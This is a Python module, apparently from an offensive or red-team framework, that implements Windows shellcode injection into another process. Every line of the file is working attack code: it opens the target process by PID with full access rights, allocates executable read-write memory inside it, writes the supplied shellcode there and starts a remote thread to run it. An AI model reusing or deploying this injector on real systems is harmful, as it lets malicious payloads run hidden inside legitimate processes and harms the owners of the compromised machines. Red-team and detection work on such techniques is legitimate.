from ctypes import windll
from modules.module import Module


class WindowShellcodeInjector(Module):
    def run(self, pid, shellcode, **args):
        print("[*] Starting windows shellcode injection module.")
        page_perms = 0x40 # RWX permissions
        access_rights = 0x1F0FFF # All access rights for opened process
        memcommit = 0x00001000 # Zeroed memory
        # Obtain a handle for the process (specified by pid) we're injecting shellcode into.
        process_handle = windll.kernel32.OpenProcess(access_rights, False, pid)
        # Allocate memory into the process
        memory_allocated = windll.kernel32.VirtualAllocEx(
                                                               process_handle,
                                                               0, len(shellcode), 
                                                               memcommit, 
                                                               page_perms)
        # Write our shellcode into the process
        windll.kernel32.WriteProcessMemory(process_handle, memory_allocated, shellcode, len(shellcode), 0)
        # Create a thread in the remote process
        windll.kernel32.CreateRemoteThread(process_handle, None, 0, memory_allocated, 0, 0, 0)
